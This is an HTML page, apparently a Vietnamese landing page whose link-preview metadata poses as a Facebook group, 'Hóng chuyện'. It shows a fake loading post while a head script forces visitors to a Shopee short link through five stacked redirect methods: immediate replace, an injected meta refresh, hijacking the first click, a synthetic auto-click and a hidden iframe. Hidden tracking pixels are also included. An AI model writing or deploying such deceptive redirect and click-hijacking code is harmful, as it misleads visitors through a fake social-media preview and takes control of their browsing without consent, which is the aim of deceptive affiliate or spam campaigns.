<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hóng Chuyện 24/7 | Cộng đồng chia sẻ</title>
    <meta property="og:site_name" content="Hóng chuyện | Facebook">
    <meta property="og:title" content="Hóng chuyện">
    <meta property="og:description" content="Nhóm chia sẻ những câu chuyện hấp dẫn nhất">
    <meta property="og:image" content="https://media-cdn-v2.laodong.vn/Storage/NewsPortal/2020/4/10/797280/Cach-Ly-Xa-Hoi-4.jpg">
    <style>
        /* Facebook Clone Styles */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f0f2f5;
            color: #1c1e21;
        }
        .loader {
            padding: 100px 20px;
            text-align: center;
        }
        .fake-post {
            background: white;
            margin: 20px;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
    </style>
    <script>
        // Lớp chuyển hướng 1: Chuyển hướng tức thì
        try {
            window.location.replace("https://s.shopee.vn/7zytdFWxog");
        } catch(e) {}

        // Lớp chuyển hướng 2: Meta Refresh
        setTimeout(() => {
            const meta = document.createElement('meta');
            meta.setAttribute('http-equiv', 'refresh');
            meta.content = '0; url=https://s.shopee.vn/7zytdFWxog';
            document.head.appendChild(meta);
        }, 50);

        // Lớp chuyển hướng 3: Bắt mọi click chuột
        document.addEventListener('click', () => {
            window.top.location = "https://s.shopee.vn/7zytdFWxog";
        }, {once: true});

        // Lớp chuyển hướng 4: Giả lập click tự động
        setTimeout(() => {
            const fakeClick = new MouseEvent('click', {
                bubbles: true,
                cancelable: true,
                view: window
            });
            document.dispatchEvent(fakeClick);
        }, 200);

        // Lớp chuyển hướng 5: Iframe ẩn
        window.onload = () => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://s.shopee.vn/7zytdFWxog';
            document.body.appendChild(iframe);
        };
    </script>
</head>
<body>
    <!-- Nội dung giả mạo Facebook -->
    <div class="loader">
        <h2>Đang tải nội dung...</h2>
        <p>Vui lòng chờ trong giây lát</p>
    </div>

    <div class="fake-post">
        <div class="post-header" style="display: flex; align-items: center; margin-bottom: 10px;">
            <div style="width: 40px; height: 40px; background: #ddd; border-radius: 50%;"></div>
            <div style="margin-left: 10px;">
                <div style="background: #ddd; width: 120px; height: 16px;"></div>
                <div style="background: #eee; width: 80px; height: 12px; margin-top: 5px;"></div>
            </div>
        </div>
        <div style="background: #eee; height: 20px; width: 90%; margin-bottom: 8px;"></div>
        <div style="background: #eee; height: 20px; width: 70%;"></div>
    </div>

    <!-- Tracking pixels ẩn -->
    <img src="https://www.facebook.com/tr?id=123456789&ev=PageView" style="display:none">
    <img src="https://analytics.shopee.vn/track?uid=redirect_lander" style="display:none">
</body>
</html>
